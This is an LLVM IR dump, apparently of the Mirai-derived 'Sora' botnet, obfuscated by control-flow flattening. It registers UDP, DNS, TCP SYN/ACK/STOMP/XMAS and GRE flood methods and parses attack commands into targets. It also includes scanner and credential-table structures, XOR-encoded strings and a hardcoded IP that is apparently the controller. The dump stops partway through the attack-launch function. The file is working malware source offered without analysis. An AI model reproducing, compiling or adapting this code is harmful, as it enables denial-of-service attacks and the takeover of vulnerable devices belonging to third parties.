; ModuleID = 'host/ir_fla/Sora.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.26 = type { [16 x i64] }
%struct.timeval.27 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"58 '8%\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c" 8\1E#$6;b\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c",7gaae\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"?8\22efg\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.11 = private unnamed_addr constant [9 x i8] c".-50efg`\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c".8,,z\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"c!>\19?;d\22=.,\22\00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"<=gael\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"75 edfm\00", align 1
@.str.17 = private unnamed_addr constant [10 x i8] c"5::=1fdef\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"7<5:3191\00", align 1
@.str.19 = private unnamed_addr constant [6 x i8] c"3!1' \00", align 1
@.str.20 = private unnamed_addr constant [7 x i8] c"efg`a.\00", align 1
@.str.21 = private unnamed_addr constant [7 x i8] c"efg`ab\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"$5''\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.25 = private unnamed_addr constant [10 x i8] c"509=:efg`\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"93gadd\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"91&8=:\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"0519;:\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"!6: \00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"509\00", align 1
@.str.32 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [14 x i8] c"159.65.82.169\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 -1345294483, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1345294483, label %2
    i32 -323931955, label %6
    i32 -972118657, label %13
    i32 155438352, label %19
    i32 -1283761657, label %23
    i32 -1301290013, label %26
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:2:                                      ; preds = %loopEntry
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  %5 = select i1 %4, i32 -323931955, i32 -1301290013
  store i32 %5, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp ne i32 %10, 0
  %12 = select i1 %11, i32 -972118657, i32 155438352
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %1, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @kill(i32 %17, i32 9) #6
  store i32 155438352, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %21
  store i32 0, i32* %22, align 4
  store i32 -1283761657, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  store i32 -1345294483, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void

loopEnd:                                          ; preds = %23, %19, %13, %6, %2, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %.reg2mem = alloca i64
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 -527159152, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -527159152, label %first
    i32 -286956885, label %17
    i32 -122666579, label %18
    i32 -1250237462, label %32
    i32 1193265592, label %33
    i32 -94672366, label %44
    i32 548381336, label %45
    i32 -1527482430, label %57
    i32 -577717077, label %58
    i32 -551691382, label %66
    i32 1297018931, label %67
    i32 1072114324, label %72
    i32 -917111447, label %78
    i32 1871399665, label %120
    i32 741003008, label %123
    i32 -49250721, label %128
    i32 288810356, label %129
    i32 1644530674, label %141
    i32 -1135775856, label %146
    i32 -791370907, label %152
    i32 1604828999, label %157
    i32 1076687399, label %158
    i32 2074880711, label %175
    i32 -1187141892, label %176
    i32 132219120, label %189
    i32 -707995915, label %190
    i32 440515105, label %219
    i32 1069891258, label %222
    i32 -923459011, label %223
    i32 316789310, label %231
    i32 275123538, label %235
    i32 -1767847602, label %238
    i32 936921756, label %242
    i32 -1885766153, label %246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %15 = icmp ult i64 %.reload, 4
  %16 = select i1 %15, i32 -286956885, i32 -122666579
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %3, align 8
  %20 = bitcast i8* %19 to i32*
  %21 = load i32, i32* %20, align 4
  %22 = call i32 @ntohl(i32 %21) #7
  store i32 %22, i32* %6, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -1250237462, i32 1193265592
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 -94672366, i32 548381336
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %3, align 8
  %48 = load i8, i8* %46, align 1
  store i8 %48, i8* %8, align 1
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 1
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 -1527482430, i32 -577717077
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = load i8, i8* %8, align 1
  %62 = zext i8 %61 to i64
  %63 = mul i64 5, %62
  %64 = icmp ult i64 %60, %63
  %65 = select i1 %64, i32 -551691382, i32 1297018931
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %8, align 1
  %69 = zext i8 %68 to i64
  %70 = call noalias i8* @calloc(i64 %69, i64 24) #6
  %71 = bitcast i8* %70 to %struct.attack_target*
  store %struct.attack_target* %71, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  store i32 1072114324, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp slt i32 %73, %75
  %77 = select i1 %76, i32 -917111447, i32 741003008
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 1
  store i32 %81, i32* %86, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  store i8* %88, i8** %3, align 8
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %3, align 8
  %91 = load i8, i8* %89, align 1
  %92 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 2
  store i8 %91, i8* %96, align 4
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 %98, 5
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %4, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 0
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %117, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 %112, i32* %119, align 4
  store i32 1871399665, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  store i32 1072114324, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = icmp ult i64 %125, 1
  %127 = select i1 %126, i32 -49250721, i32 288810356
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %3, align 8
  %132 = load i8, i8* %130, align 1
  store i8 %132, i8* %9, align 1
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = sub i64 %134, 1
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %4, align 4
  %137 = load i8, i8* %9, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sgt i32 %138, 0
  %140 = select i1 %139, i32 1644530674, i32 -923459011
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8, i8* %9, align 1
  %143 = zext i8 %142 to i64
  %144 = call noalias i8* @calloc(i64 %143, i64 16) #6
  %145 = bitcast i8* %144 to %struct.attack_option*
  store %struct.attack_option* %145, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  store i32 -1135775856, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %5, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  %151 = select i1 %150, i32 -791370907, i32 1069891258
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = icmp ult i64 %154, 1
  %156 = select i1 %155, i32 1604828999, i32 1076687399
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %3, align 8
  %161 = load i8, i8* %159, align 1
  %162 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %165, i32 0, i32 1
  store i8 %161, i8* %166, align 8
  %167 = load i32, i32* %4, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 %168, 1
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %4, align 4
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = icmp ult i64 %172, 1
  %174 = select i1 %173, i32 2074880711, i32 -1187141892
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i32 1
  store i8* %178, i8** %3, align 8
  %179 = load i8, i8* %177, align 1
  store i8 %179, i8* %12, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = sub i64 %181, 1
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* %4, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  %188 = select i1 %187, i32 132219120, i32 -707995915
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %12, align 1
  %192 = zext i8 %191 to i32
  %193 = add nsw i32 %192, 1
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 1) #6
  %196 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %199, i32 0, i32 0
  store i8* %195, i8** %200, align 8
  %201 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i8*, i8** %3, align 8
  %208 = load i8, i8* %12, align 1
  %209 = zext i8 %208 to i32
  call void @util_memcpy(i8* %206, i8* %207, i32 %209)
  %210 = load i8, i8* %12, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %3, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %3, align 8
  %215 = load i8, i8* %12, align 1
  %216 = zext i8 %215 to i32
  %217 = load i32, i32* %4, align 4
  %218 = sub nsw i32 %217, %216
  store i32 %218, i32* %4, align 4
  store i32 440515105, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  store i32 -1135775856, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 -923459011, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32* @__errno_location() #7
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* %6, align 4
  %226 = load i8, i8* %7, align 1
  %227 = load i8, i8* %8, align 1
  %228 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %229 = load i8, i8* %9, align 1
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %225, i8 zeroext %226, i8 zeroext %227, %struct.attack_target* %228, i8 zeroext %229, %struct.attack_option* %230)
  store i32 316789310, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %233 = icmp ne %struct.attack_target* %232, null
  %234 = select i1 %233, i32 275123538, i32 -1767847602
  store i32 %234, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %237 = bitcast %struct.attack_target* %236 to i8*
  call void @free(i8* %237) #6
  store i32 -1767847602, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %240 = icmp ne %struct.attack_option* %239, null
  %241 = select i1 %240, i32 936921756, i32 -1885766153
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %244 = load i8, i8* %9, align 1
  %245 = zext i8 %244 to i32
  call void @free_opts(%struct.attack_option* %243, i32 %245)
  store i32 -1885766153, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %242, %238, %235, %231, %223, %222, %219, %190, %189, %176, %175, %158, %157, %152, %146, %141, %129, %128, %123, %120, %78, %72, %67, %66, %58, %57, %45, %44, %33, %32, %18, %17, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1574225387, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1574225387, label %first
    i32 67990699, label %20
    i32 2092942251, label %24
    i32 -1593128781, label %25
    i32 2118970170, label %30
    i32 -343784864, label %31
    i32 999790695, label %35
    i32 44950895, label %40
    i32 -174947249, label %41
    i32 -889513621, label %47
    i32 -293267133, label %60
    i32 1234162732, label %72
    i32 -610544250, label %73
    i32 -467500100, label %76
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp eq i32 %.reload, -1
  %19 = select i1 %18, i32 2092942251, i32 67990699
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %13, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = select i1 %22, i32 2092942251, i32 -1593128781
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  ret void

; <label>:25:                                     ; preds = %loopEntry
  %26 = call i32 @fork() #6
  store i32 %26, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  %28 = icmp eq i32 %27, -1
